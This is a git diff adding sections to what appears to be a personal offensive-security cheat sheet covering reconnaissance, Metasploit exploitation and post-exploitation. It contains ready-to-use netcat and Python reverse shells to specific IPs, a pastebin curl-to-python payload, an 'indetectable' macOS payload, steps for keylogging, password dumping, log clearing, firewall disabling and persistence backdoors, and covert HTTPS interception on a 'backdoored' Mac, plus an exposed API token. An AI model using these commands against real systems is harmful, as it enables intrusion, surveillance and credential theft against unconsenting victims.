@@ -718,7 +718,604 @@ sudo apt update
 sudo apt install realtek-rtl88xxau-dkms
 ```
 
-# Tools
+# Analisys
+
+## Nessus
+
+download & activation:
+
+https://es-la.tenable.com/products/nessus/nessus-professional
+
+install:
+
+	cd downloads
+	dpkg -i Nessus-VERSION.deb
+
+## Recon-ng
+
+	marketplace install all (install all modules)
+	
+	modules search (search for modules)
+	
+	workspace add myworkspace (create workspace)
+	add domains website.com (add domain)
+	show domains
+
+Methode 1:
+
+	use discovery/info_disclosure/cache_snoop
+	show info
+	set ...
+	run
+
+Methode 2:
+
+	modules load discovery/info_disclosure/cache_snoop
+	options list / info
+	options set NAMESERVER 162.159.24.80
+	run
+	
+	back
+	
+	modules load discovery/info_disclosure/interesting_files
+	options list / info
+	options set PORT 443 (for https / 80 http)
+	options set PROTOCOL https
+	options set SOURCE www.website.com
+	run
+
+## Others
+
+	snmp-check 10.1.1.12 -w
+
+## Openvas
+
+	sudo openvasmd --get-users (get users)
+	sudo openvasmd --user=admin --new-password=sup3rs3cr3t (change password)
+
+## Metasploit
+
+## Armitage
+
+	systemctl start postgresql (start the PostgreSQL Database)
+	msfdb init (initialize metasploit database or see metasploit instruction)
+
+# Enumeration
+
+## Enumeration (pasive)
+
+Whois:
+
+Get domains, ip ranges
+
+http://whois.domaintools.com/
+http://robtex.com/
+
+Autonom systems:
+
+Get autonom systems, ip ranges and domains (not subdomains)
+
+https://bgp.he.net/
+http://ipv4info.com/
+
+Get subdomains informations:
+
+Get subdomains
+
+https://dnsdumpster.com/
+
+Google:
+
+	site:website.com -site:www.site.com
+	site:.com
+	related:lemonde.fr
+	intitle: "Index of /" site:www.website.com
+	allintitle: "Index of /" site:www.website.com
+	inurl:"admin.php"
+	allinurl:"admin.php"
+	intext:"admin" intext:"password"
+	allintext:"admin" intext:"password"
+	filetype:xls
+	ext:xls
+	
+	site:website && intext:test
+	site:website OR intext:@gmail.com
+
+https://www.exploit-db.com/google-hacking-database
+
+Bing:
+
+	ip:192.93.13.54
+	location:fr
+
+Harvester:
+
+Get emails info and domains
+
+	theHarvester -d website.com -l 500 -b all
+
+Archive:
+
+Watch first website versions
+
+https://archive.org/
+
+Search vulerabilities, credentials, testing features.
+
+Online Passive Scans:
+
+https://www.shodan.io/
+
+	apache
+	net:140.43.34.54/16
+	title:title
+	port:
+	org:"Universidad.."
+	hostname:website.com
+
+https://www.zoomeye.org/
+https://censys.io/ipv4
+
+## Enumeration (active)
+
+### Sniffing
+
+Wireshark:
+
+	!(ip.addr == 10.0.0.12)
+	Statistics => Conversations =>IPv4
+
+### Scan
+
+Arp scan:
+
+	arp-scan 10.1.1.0/24
+
+Nmap:
+
+	nmap -sn 10.1.1.12 (default - ping)
+	nmap -Pn 10.1.1.12 (no ping - service scan)
+	nmap -sP 10.1.1.12/24 (ping icmp - no service - system on (bypass ping filtering))
+	
+	nmap -sT 10.1.1.12/24 (service TCP - 1000 ports)
+	nmap -sU 10.1.1.12/24 (service UDP- 1000 ports - slower than TCP)
+	
+	nmap -sT -p 80,8080 10.1.1.12/24 (services TCP on ports)
+	nmap -sT -p- 10.1.1.12/24 (services TCP all ports)
+	nmap -sT 10.1.1.12/24 -n (services TCP - no resolution DNS (no detection))
+	nmap -sT -Pn10.1.1.12/24 -n --open (open's services TCP - no resolution DNS (no detection))
+	
+	nmap -sT 10.1.1.12/24 -n --open -n -Pn -O (open's services TCP - no resolution DNS (no detection) - no ping - OS)
+	nmap -sT 10.1.1.12/24 -n --open -n -Pn -sV (open's services TCP - no resolution DNS (no detection) - no ping - versions)
+	nmap -sT 10.1.1.12/24 -n --open -n -Pn -sC (open's services TCP - no resolution DNS (no detection) - no ping - scripts)
+	nmap -sT 10.1.1.12/24 -n --open -n -Pn -A (open's services TCP - no resolution DNS (no detection) - no ping - OS, versions, scripts, traceroute)
+
+Netcat:
+
+installed on all unix by default (macos, linux), default shell command lines.
+
+	nc -z -v 10.1.1.12 -n
+	nc -zvn 10.1.1.12 100-500
+
+### DNS
+
+Manual DNS enumeration:
+
+	dig website.com (get type A)
+	dig mx website.com (get type MX)
+	dig ns website.com (get type NS)
+	
+	host -t axfr website.com
+	dig axfr @SERVER-DNS website.com (DNS zone attack)
+
+Auto DNS enumeration:
+
+	dnsenum website.com
+	dnsenum -enum website.com
+	
+	dnsmap website.com (dictionary DNS resolution)
+	
+	fierce -dns website.com (dictionary DNS resolution - bigger)
+
+### Metasploit
+
+Scan:
+
+import to metasploit:
+
+	nmap -A 10.1.1.12 -oA basename (output file)
+	db_import /root/basename.xml
+
+or run from metasploit:
+
+	db_nmap -A 10.1.1.12 (use nmap command)
+	
+	hosts (show results)
+	hosts -c address,os_name (filter view)
+	
+	services (show services)
+	services -c name,info 10.1.1.12 (filter view)
+	services -c name,info -S http (filter view, search services)
+	services -c name,info -p 4545 (filter view, search ports)
+
+# Exploitation
+
+## Netcat
+
+Installed on all unix by default (macos, linux), default shell command lines.
+Can be used like payload and execute a shell in last versions. (on MacOs, can't execute -e directly)
+
+direct connection: when attacker connect and victim listen
+reverse connection: when attacker listen and victim connect (not detected by firewalls - antivirus)
+
+Kali:
+
+	nc MACOS/Windows-IP 8888  -e /bin/bash (connect)
+	nc  -lvvp 8888 -e /bin/bash (listen)
+
+MacOS:
+
+	nc KALI-IP 8888 (connect - cannot execute -e directly)
+	nc -l 8888 (listen - cannot execute -e directly)
+
+Windows:
+
+	nc KALI-IP 8888 -e cmd.exe (connect)
+	nc  -lvvp 8888 -e cmd.exe (listen)
+
+## Metasploit
+
+sudo msfdb init && msfconsole
+
+Exploits:
+
+	search exploit/osx
+	
+	use exploit/osx/...
+	show info
+	
+	options
+	set options value
+	
+	set payload [TAB] (payload compatible with exploit)
+	set payload osx/meterpreter/reverse_tcp
+	options
+	show info (payload max space, rank)
+	
+	exploit (run exploit & active payload)
+	
+	use exploit/windows/smb/ms08_067_netapi (smb exploit)
+	
+	use exploit/multi/handler (listener)
+
+### Payloads
+
+Add user:
+
+	set payload windows/adduser
+	options
+	show target (if don't autodetect)
+	set target ...
+
+### Meterpreter
+
+	set payload windows/meterpreter/bind_tcp (direct connection)
+	set payload windows/meterpreter/reverse_tcp (reverse connection (bypass firewall))
+	set payload windows/meterpreter/reverse_http (reverse connection - tunelize on http port)
+
+### VncInject
+
+	set payload windows/vncinject/reverse_tcp (reverse connection -  remote access (visible on target screen))
+
+### Shell
+
+	set payload windows/shell/reverse_tcp (reverse connection - light payload - shell (used to execute meterpreter))
+	send shell on background
+
+### Auxilary
+
+https://www.offensive-security.com/metasploit-unleashed/auxiliary-module-reference/
+
+```bash
+use auxilary/scanner/discovery/arp_sweep (scanner ARP)
+show_info
+set rhosts 10.1.1.0/24
+run
+
+use auxilary/scanner/smb/pipe_auditor (check if smb is active to run exploit like netapi)
+```
+
+### Add modules to metasploit
+
+Terminal:
+
+```bash
+mkdir /usr/share/metasploit-framework/modules/exploits/custom/
+cd /usr/share/metasploit-framework/modules/exploits/custom/
+wget https://gist.githubusercontent.com/todb-r7/5935519/raw/f18d6b0dcd94d135a567e5b50a9b1cab3a1c5e1b/test_module.rb  (module used for test => https://gist.github.com/todb-r7/5935519)
+
+can add new modules in each directories (exploits/custom, aucilary/custom, etc.) (custom modules have to be in ruby, .rb)
+```
+
+Metasploit:
+
+	reload_all (on metasploit console to load new exploit or restart metasploit)
+	use exploit/custom/test_module
+
+### External Tools
+
+#### Msfvenom
+
+Payload generation:
+
+	msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=10.1.1.12 lport=4545 -e x86/shikata_ga_nai -b '\x00' -i 3 -f exe -o test.exe
+	
+	-a: x86/x64
+	--platform: platform
+	-p: payload
+	-lhost: kali ip
+	-lport: port
+	-e: encoder
+	-b: bad caracter to encode
+
+##### Metasploit
+
+	use exploit/multi/handler (listener)
+	set payload windows/meterpreter/reverse_tcp
+	set lhost 10.1.1.12
+	set lport 4545 
+	run
+
+#### Armitage
+
+GUI client for Metasploit, automated tools. (not complete like real metasploit)
+
+Can be used for scaning (auxilary modules, nmap, etc...), detect OS and find vulnerabilities for this system, but is better to run the exploits from metasploit command lines.
+
+	Attacks => Find attacks (find vulnerabilities for this system)
+	Attacks => Hail Mary  (autopwn - run all compatible exploits - very agressive - should not be used)
+
+# Post exploitation
+
+## Meterpreter
+
+	help
+	help -l (show librairies - used to increment features)
+
+### Informations
+
+	sysinfo (system details)
+	getpid (pid of process used by meterpreter)
+	ps (show process)
+	getuid (show system and user)
+	
+	migrate pid (migrate process to explorer.exe)
+
+### Scripts
+
+	run checkvm (check if is virtual machine)
+	run get_env (environment details)
+	run get_applications_list (app list & versions)
+	
+	run scraper (run lot of scripts and save all on files) (use registry - danger for antivirus)
+	cd /root/.msf4/logs/scripts/scraper/...
+	
+	run winenum (run lot of scripts and save all on files) (don't use registry - less danger for antivirus)
+	
+	run killav (check if antivirus from list of 50 and desactivate it)
+
+### Elevate privileges
+
+	getsystem
+
+if already have system privilege, can migrate to another process with user privilege and get system privilege easily for this process.
+
+	rev2self (comeback to anterior privileges)
+
+### Passwords
+
+	hashdump (get credentials hash of all users - need system privilege)
+
+### Librairies
+
+	use -l
+	
+	use mimikatz (search password on system memory)
+	help
+	wdigest (get list of passwords on memory)
+	
+	use kiwi (search password on system memory - modern version)
+	help
+	creds_all
+
+### Remove trace
+
+	clearrev (clear logs - system privileges)
+
+### Desactivate firewall
+
+	shell (system privileges)
+	netsh firewall show opmode (on windows shell - check status of firewall)
+	netsh firewall set opmode mode = disable profile = all (on windows shell - check status of firewall)
+	exit
+
+### Keyloger
+
+	keyscan_start (need to be user who want to spy)
+	keyscan_dump (results)
+	keyscan_stop
+	screenshot
+	run vnc (remote access)
+	record_mic 10 (record 10s)
+
+### Sniffer
+
+Network sniffer.
+
+Librairies:
+
+	use -l
+	
+	use sniffer
+	sniffer_interfaces (show interfaces)
+	sniffer_start 1 1024 (interface & buffer (when buffer is full the datas we'll be send))
+	sniffer_stats 1 (status)
+	sniffer_dump 1 file.pcap (send results to file)
+	wireshark file.pcap (open file)
+	sniffer_stop 1
+
+### Backdoor
+
+Easy backdoor implementation.
+
+	run persistence -h (execute payload - program task)
+	run persistence (configuration recommanded)
+	
+	run persistence -A -L C:\\temp\\ -x -i 15 -p 443 -r 10.1.1.12
+	
+	: Automatically start
+	: localisation
+	: Automatically start on boot
+	: time in second to try connect to listener (recommanded to use bigger number)
+	: port
+	: Kali IP
+
+keep information returning by the console to analyse - contain link to script (.rc) to remove persitence
+	
+resource URL (use link returning by console)
+
+## Netcat & TCPDump
+
+### Data in file
+
+Sniff traffic from a mac with netcat (default on macos) and use tcpdump (default on macos) to send the traffic to Kali then use wireshark to analyse that traffic:
+
+	- nc -l -p 7777 | tee /tmp/sniffed_output.pcap (on kali, without -p for mac)
+	- /usr/sbin/tcpdump -w - | nc KALI_IP 7777 (on mac)
+
+### Data in real time
+
+On kali:
+
+	- mkfifo /tmp/wiretap
+	- nc -l -p 9999 > /tmp/wiretap
+	- wireshark -k -i /tmp/wiretap
+
+On mac:
+
+	- /usr/sbin/tcpdump -i <interface> -w - | nc 1.2.3.4 9999
+
+## Sniffing https traffic (BURP)
+
+Download BURP Pro and execute file (optional):
+
+	- sudo bash /path/to/file
+
+Open and configure proxy on burpsuite (port and ip).
+
+On backdoored mac:
+
+	- curl -s --insecure --proxy http://192.168.0.110:8080 http://burp/cert -o /tmp/burp.der (download certificate)
+
+In the above command, curl will silently (-s) download the certificate from our Kali machine. The --proxy argument is required because we're instructing curl to use the newly configured Burp listener to fetch the certificate; This certificate isn't trusted by curl (or any web browser) by default, so the --insecure argument is required to ignore warnings in the output. Finally, the Burp certificate is saved (-o) to the /tmp directory with the file name burp.der. The .der file extension is merely the certificate's default file format and shouldn't be changed.
+
+	- security add-trusted-cert -k /Library/Keychains/System.keychain -d /tmp/burp.der (add certificate to mac keychain)
+
+Security will add (add-trusted-cert) and fully trust the certificate (-d /tmp/burp.der) into the macOS primary system Keychain (-k). All we have to do now is configure macOS to send us all of the target's web traffic.
+
+List network services (optional):
+
+	- /usr/sbin/networksetup -listallnetworkservices
+	- /usr/sbin/networksetup -getwebproxy "Wi-Fi"
+	- /usr/sbin/networksetup -getsecurewebproxy "Wi-Fi"
+
+Active the certicate for http and https requests:
+
+	- /usr/sbin/networksetup -setwebproxy "Wi-fi" 192.168.0.110 8080
+	- /usr/sbin/networksetup -setsecurewebproxy "Wi-fi" 192.168.0.110 8080
+
+Then in Burp, in HTTP history, all the traffic appear in clear.
+
+We can send the encoded URL parameters in encoders, choose URL format, to decode parameters if necessary.
+
+PortSwigger CA certificate are certificate created from Burp, can search it on keychain. Also can verify proxy configuration on system preference, network, on mac.
+
+Keep connection open:
+
+Use caffeinate to force keep the connection open:
+
+	- caffeinate &
+
+Desactive the certificate for http and https:
+
+	- /usr/sbin/networksetup -setwebproxystate "Wi-fi" off
+	- /usr/sbin/networksetup -setsecurewebproxystate "Wi-fi" off
+
+Can use a VPS to use this technic if we are not in the same network.
+
+# Wifi network
+
+## 
+
+# Security tools
+
+## Aircrack
+
+To crack WEP for a given essid name and store into a file
+
+    aircrack-ng -a 1 -e <essid> -l <output file> <.cap or .ivs file(s)>
+
+To crack WPA/WPA2 from airolib-ng database
+
+    aircrack-ng -e <essid> -r <database> <.cap or .ivs file(s)>
+
+To crack WPA/WPA2 from a wordlist
+
+    aircrack-ng -e <essid> -w <wordlist> <.cap or .ivs file(s)>
+
+To crack a given bssid
+
+    aircrack-ng -b <bssid> -l <output file> <.cap or .ivs file(s)>
+
+To crack a given bssid using FMS/Korek method
+
+    aircrack-ng -K -b <bssid> <.cap or .ivs file(s)>
+
+To crack a given essid (WEP) and display the ASCII of the key
+
+    aircrack-ng -e <essid> -s <.cap of .ivs file(s)>
+
+To crack a given essid (WEP) and create a EWSA Project
+
+    aircrack-ng -e <essid> -E <EWSA file> <.cap or .ivs file(s)>
+
+## Beef
+
+### Mac installation
+
+On your git folder:
+
+Clone the repository on and enter in the beef folder:
+
+	git clone https://github.com/beefproject/beef
+	cd beef
+
+Then install all gem needed:
+
+https://github.com/beefproject/beef/blob/master/Gemfile
+
+	gem install bundler (install bundler installer)
+	verify if the "Gemfile" exist in the folder
+	bundle install (install all gem from Gemfile)
+	./install
+
+Run Beef:
+
+	./beef
+
+```
+git pull (update repository)
+```
 
 ## Bettercap
 
@@ -877,3 +1474,353 @@ function onRequest(req, res) {
 }
 ```
 
+## Crunch
+
+Main command:
+
+```bash
+crunch <min> <max> <character-set> -t <pattern> -o <path>
+```
+
+crunch – crunch is the keyword which notifies the system to use this tool.
+<min> – here you specify the minimum length characters you want.
+<max> – here you specify the maximum length of characters.
+<character-set> – here you specify the characters you want it to use while creating the dictionary.
+-t <pattern>- this is optional but here you can specify the pattern in with you want your character-set to be.
+-o <path> – here you give the path where you want your dictionary file to be saved.
+
+Example:
+
+	• crunch 2 4 -f /usr/local/Cellar/crunch/3.6/share/charset.lst mixalpha-numeric -o nicotest.txt
+	
+	• crunch 8 8 -f /usr/share/crunch/charset.lst hex-lower -d 2@ (not 3 same characters one after other)
+
+Charsets:
+
+hex-lower = [0123456789abcdef]
+hex-upper = [0123456789ABCDEF]
+
+numeric = [0123456789]
+numeric-space = [0123456789 ]
+
+symbols14 = [!@#$%^&*()-_+=]
+symbols14-space = [!@#$%^&*()-_+= ]
+
+symbols-all = [!@#$%^&*()-_+=~`[]{}|\:;"'<>,.?/]
+symbols-all-space = [!@#$%^&*()-_+=~`[]{}|\:;"'<>,.?/ ]
+
+ualpha = [ABCDEFGHIJKLMNOPQRSTUVWXYZ]
+ualpha-space = [ABCDEFGHIJKLMNOPQRSTUVWXYZ ]
+ualpha-numeric = [ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789]
+ualpha-numeric-space = [ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 ]
+ualpha-numeric-symbol14 = [ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_+=]
+ualpha-numeric-symbol14-space = [ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_+= ]
+ualpha-numeric-all = [ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_+=~`[]{}|\:;"'<>,.?/]
+ualpha-numeric-all-space = [ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_+=~`[]{}|\:;"'<>,.?/ ]
+
+lalpha = [abcdefghijklmnopqrstuvwxyz]
+lalpha-space = [abcdefghijklmnopqrstuvwxyz ]
+lalpha-numeric = [abcdefghijklmnopqrstuvwxyz0123456789]
+lalpha-numeric-space = [abcdefghijklmnopqrstuvwxyz0123456789 ]
+lalpha-numeric-symbol14 = [abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_+=]
+lalpha-numeric-symbol14-space = [abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_+= ]
+lalpha-numeric-all = [abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_+=~`[]{}|\:;"'<>,.?/]
+lalpha-numeric-all-space = [abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_+=~`[]{}|\:;"'<>,.?/ ]
+
+mixalpha = [abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ]
+mixalpha-space = [abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ ]
+mixalpha-numeric = [abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789]
+mixalpha-numeric-space = [abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 ]
+mixalpha-numeric-symbol14 = [abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_+=]
+mixalpha-numeric-symbol14-space = [abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_+= ]
+mixalpha-numeric-all = [abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_+=~`[]{}|\:;"'<>,.?/]
+mixalpha-numeric-all-space = [abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_+=~`[]{}|\:;"'<>,.?/ ]
+
+#########################
+
+### Uppercase ###
+
+ualpha-sv = [ABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ]
+ualpha-space-sv = [ABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ ]
+ualpha-numeric-sv = [ABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ0123456789]
+ualpha-numeric-space-sv = [ABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ0123456789 ]
+ualpha-numeric-symbol14-sv = [ABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ0123456789!@#$%^&*()-_+=]
+ualpha-numeric-symbol14-space-sv = [ABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ0123456789!@#$%^&*()-_+= ]
+ualpha-numeric-all-sv = [ABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ0123456789!@#$%^&*()-_+=~`[]{}|\:;"'<>,.?/]
+ualpha-numeric-all-space-sv = [ABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ0123456789!@#$%^&*()-_+=~`[]{}|\:;"'<>,.?/ ]
+
+### Lowercase ###
+
+lalpha-sv = [abcdefghijklmnopqrstuvwxyzåäö]
+lalpha-space-sv = [abcdefghijklmnopqrstuvwxyzåäö ]
+lalpha-numeric-sv = [abcdefghijklmnopqrstuvwxyzåäö0123456789]
+lalpha-numeric-space-sv = [abcdefghijklmnopqrstuvwxyzåäö0123456789 ]
+lalpha-numeric-symbol14-sv = [abcdefghijklmnopqrstuvwxyzåäö0123456789!@#$%^&*()-_+=]
+lalpha-numeric-symbol14-space-sv = [abcdefghijklmnopqrstuvwxyzåäö0123456789!@#$%^&*()-_+= ]
+lalpha-numeric-all-sv = [abcdefghijklmnopqrstuvwxyzåäö0123456789!@#$%^&*()-_+=~`[]{}|\:;"'<>,.?/]
+lalpha-numeric-all-space-sv = [abcdefghijklmnopqrstuvwxyzåäö0123456789!@#$%^&*()-_+=~`[]{}|\:;"'<>,.?/ ]
+
+### Mixcase ###
+
+mixalpha-sv = [abcdefghijklmnopqrstuvwxyzåäöABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ]
+mixalpha-space-sv = [abcdefghijklmnopqrstuvwxyzåäöABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ ]
+mixalpha-numeric-sv = [abcdefghijklmnopqrstuvwxyzåäöABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ0123456789]
+mixalpha-numeric-space-sv = [abcdefghijklmnopqrstuvwxyzåäöABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ0123456789 ]
+mixalpha-numeric-symbol14-sv = [abcdefghijklmnopqrstuvwxyzåäöABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ0123456789!@#$%^&*()-_+=]
+mixalpha-numeric-symbol14-space-sv = [abcdefghijklmnopqrstuvwxyzåäöABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ0123456789!@#$%^&*()-_+= ]
+mixalpha-numeric-all-sv = [abcdefghijklmnopqrstuvwxyzåäöABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ0123456789!@#$%^&*()-_+=~`[]{}|\:;"'<>,.?/]
+mixalpha-numeric-all-space-sv = [abcdefghijklmnopqrstuvwxyzåäöABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ0123456789!@#$%^&*()-_+=~`[]{}|\:;"'<>,.?/
+
+## Netcat
+
+Kali:
+
+	nc MACOS/Windows-IP 8888  -e /bin/bash (connect)
+	nc  -lvvp 8888 -e /bin/bash (listen)
+
+MacOS:
+
+	nc KALI-IP 8888 (connect - cannot execute -e directly)
+	nc -l 8888 (listen - cannot execute -e directly)
+
+Windows:
+
+	nc KALI-IP 8888 -e cmd.exe (connect)
+	nc  -lvvp 8888 -e cmd.exe (listen)
+
+### Reverse Shell
+
+Shell:
+
+	mkfifo /tmp/f; nc 192.168.0.110 2222 0</tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+
+Bash:
+
+	mkfifo /tmp/f; nc 51.210.47.127 1234 0</tmp/f | /bin/bash -i >/tmp/f 2>&1; rm /tmp/f
+
+Bash: (root)
+
+	mkfifo /tmp/f; nc 51.210.47.127 1234 0</tmp/f | sudo /bin/bash -i >/tmp/f 2>&1; rm /tmp/f
+
+### Netcat & TCPDump
+
+Sniff traffic from a mac with netcat (default on macos) and use tcpdump (default on macos) to send the traffic to Kali then use wireshark to analyse that traffic
+
+#### Data in file
+
+	/usr/sbin/tcpdump -w - | nc KALI_IP 7777 (on mac)
+	nc -l -p 7777 | tee /tmp/sniffed_output.pcapng (on kali)
+
+#### Data in real time
+
+On kali:
+
+	mkfifo /tmp/wiretap
+	nc -l -p 9999 > /tmp/wiretap
+	wireshark -k -i /tmp/wiretap
+
+On mac:
+
+	/usr/sbin/tcpdump -i <interface> -w - | nc 1.2.3.4 9999
+
+### Netcat & Payload
+
+#### Option 1
+
+Create an indetectable payload in python and use it to get a shell on every macos system:
+
+	nc -l -p 8080 (listening on kali)
+
+Create a python payload:
+
+	nano payload.py (and paste that script changing the ip)
+	import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("1.2.3.4",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);
+
+Then, just have to execute that script on macos computer.
+
+	sudo python payload.py
+
+#### Option 2
+
+An other option is to send the script online with a pastebin web service:
+
+	https://pastebin.com
+
+And execute this command on the macos computer:
+
+	curl https://pastebin.com/raw/P6p9WwAT | python - &
+
+#### Option 3
+
+Create a MacOs application to run the script on background with platypus:
+
+	https://sveinbjorn.org/platypus
+
+### Scanner
+
+Check TCP ports:
+
+    nc -zn RHOST PORTS
+
+Check TCP ports: (verbose)
+
+    nc -znv RHOST PORTS
+
+Check UDP ports:
+
+    nc -znu RHOST PORTS
+
+Check UDP ports: (verbose)
+
+    nc -znvu RHOST PORTS
+
+## Nmap
+
+```bash
+nmap 10.0.0.0-15 -v
+nmap scanme.nmap.org -v
+nmap -sP 192.168.0.0/24 -oN file.txt
+nmap 10.0.0.0/24 --exclude 10.0.0.1,10.0.0.2
+```
+
+Scan of services:
+
+	nmap 10.0.0.0-15 -sV
+	nmap 10.0.0.0-15 -sV --version-light
+	nmap 10.0.0.0-15 -sV --version-all
+
+OS detection:
+
+	nmap 10.0.0.0-15 -O -v -p80
+	nmap 10.0.0.0-15 -O -v -osscan-limit
+	nmap 10.0.0.0-15 -O -v -osscan-guess
+
+OS detection, versions, scripts, traceroute:
+
+	nmap 10.0.0.0-15 -A
+
+Scripts:
+
+	nmap 10.0.0.0 -sC -v
+	nmap scanme.nmap.org --script default -v
+	nmap scanme.nmap.org --script "http-*" -p80 -v
+	nmap scanme.nmap.org --script "not dos" -p80 -v
+	nmap --script-updatedb 
+
+Scenario:
+
+	nmap 10.0.0.0 -p21
+	nmap 10.0.0.0 -p21 -sV
+	Locate "*vsftp*.nse"
+	nmap 10.0.0.0 -p21 --script ftp-vsftp-backdoor
+
+## PS
+
+To list every process on the system:
+
+    ps aux
+
+To list a process tree
+
+    ps axjf
+
+To list every process owned by foouser:
+
+    ps -aufoouser
+
+To list every process with a user-defined format:
+
+    ps -eo pid,user,command
+
+List the processes being run by a particular set of usernames
+
+    ps -f -u username1, username2, .... ,usernameN 
+
+Display a list of processes with a particular parent ID (5589)
+Note that when a process is launched it may spawn several other sub processes which all share a common parent process ID
+
+    ps -f -ppid 5589
+
+List processes with given PIDs
+
+    ps -f -p 25001, 4567, 789
+
+Display all processes owned by the current user
+
+    ps -U $USER
+
+Sort processes based on CPU and memory usage (useful for finding memory leaks)
+
+    ps aux --sort pmem
+
+## Shodan
+
+Filter IP range
+
+    net:<ip range>
+
+Filter port
+
+    port:<port>
+
+Filter location
+
+    city:"<city>" country:<country_code>
+    geo:<coords>
+
+Filter hostname
+
+    hostname:<hostname>
+
+Filter operating system
+
+    os:<operating system>
+
+Filter dates
+
+Acceptable formats are: day/month/year or day-month-year
+
+    before:<date>
+    after:<date>
+
+## Wpscan
+
+Update database:
+
+	• wpscan -update
+
+Target URI:
+
+	• wpscan --url targetwordpressurl.com --api-token kIsaNW6wucvs5IJMq5afkDFhh8ZjAXZ6yvN7JgfQglk
+
+Enumerating WordPress Theme:
+
+	• wpscan -u http://targetwordpressurl.com --enumerate t
+
+Enumerating Popular WordPress Plugins:
+
+	• wpscan --url http://targetwordpressurl.com --enumerate p --plugins-detection mixed
+
+Enumerating WordPress Vulnerable Theme:
+
+	• wpscan -u http://targetwordpressurl.com --enumerate vt
+
+Enumerating WordPress Plugins:
+
+	• wpscan —url http://targetwordpressurl.com --enumerate ap
+
+Enumerating WordPress Vulnerable Plugins:
+
+	• wpscan -u http://targetwordpressurl.com --enumerate vp
+
+Enumerating WordPress User:
+
+	• wpscan -u http://targetwordpressurl.com --enumerate u
+
+Enumerate ALL with a single command:
+
+	• wpscan -u http://targetwordpressurl.com -e at -e ap -e u
+
+-e at: enumerate all themes of targeted website
+-e ap: enumerate all plugins of targeted website
+-e u: enumerate all usernames of targeted website
